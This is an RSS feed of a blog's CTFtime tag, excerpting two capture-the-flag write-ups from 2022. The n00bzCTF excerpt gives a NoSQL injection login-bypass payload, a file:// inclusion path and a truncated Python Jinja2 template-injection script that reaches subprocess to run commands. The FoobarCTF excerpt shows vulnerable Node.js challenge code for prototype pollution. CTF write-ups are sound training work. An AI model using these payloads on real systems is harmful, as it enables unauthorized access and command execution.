<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CTFtime on DH.J</title>
    <link>https://blog.jhyeon.dev/tags/ctftime/</link>
    <description>Recent content in CTFtime on DH.J</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Mon, 06 Jun 2022 00:00:00 +0900</lastBuildDate><atom:link href="https://blog.jhyeon.dev/tags/ctftime/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>2022 n00bzCTF Write up</title>
      <link>https://blog.jhyeon.dev/posts/20220606_n00bzctf/</link>
      <pubDate>Mon, 06 Jun 2022 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20220606_n00bzctf/</guid>
      <description>Summary TEAM : DEMON
Rank : 14th
Web nosqlforyou NOSQL Injection, Authentication Bypass Exploit username=admin password={&amp;#34;$gt&amp;#34;: &amp;#34;&amp;#34;} curl-as-service Python Local File Inclusion Exploit file:///chall/challenge.py Rlass Flask Jinja2 Template SSTI Injection Exploit from requests import post import html cmd = &amp;#34;cat flag&amp;#34; mro = &amp;#34;request|attr(request.args.class)|attr(request.args.mro)&amp;#34; subclasses = &amp;#34;((%s)[3]|attr(request.args.sc))()&amp;#34; % mro popen = &amp;#34;(%s)[363]&amp;#34; % subclasses code = &amp;#34;(%s)(request.args.cmd.split(&amp;#39; &amp;#39;), stdout=-1).communicate()[0]&amp;#34; % popen payload = &amp;#34;{%%print(%s)%%} {# curl http:// #}&amp;#34; % code res = post(&amp;#39;http://167.</description>
    </item>
    
    <item>
      <title>2022 FoobarCTF Write up</title>
      <link>https://blog.jhyeon.dev/posts/20220321_foobarctf/</link>
      <pubDate>Mon, 21 Mar 2022 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20220321_foobarctf/</guid>
      <description>Summary TEAM : DEMON
Rank : 13th
Web Find My Location Node.JS Prototype Pollution const express = require(&amp;#39;express&amp;#39;); const bodyParser = require(&amp;#39;body-parser&amp;#39;); const cors = require(&amp;#39;cors&amp;#39;); const app = express(); const cookieParser = require(&amp;#39;cookie-parser&amp;#39;); app.use(cookieParser()); app.use(express.json()) app.set(&amp;#39;view engine&amp;#39;, &amp;#39;ejs&amp;#39;); const port = process.env.PORT || 3000 app.use(express.static(__dirname + &amp;#39;/public&amp;#39;)); app.use(cors()) const users = [ { name: &amp;#39;user&amp;#39;, password: &amp;#39;pwd&amp;#39; }, { name: &amp;#39;admin&amp;#39;, password: Math.random().toString(32), isAdmin: true }, ]; const myLoaction = [ { flag: &amp;#34;GLUG{f4k3_fl4g_f0r_t3st1ng}&amp;#34; } ] function findUser(auth) { return users.</description>
    </item>
    
  </channel>
</rss>
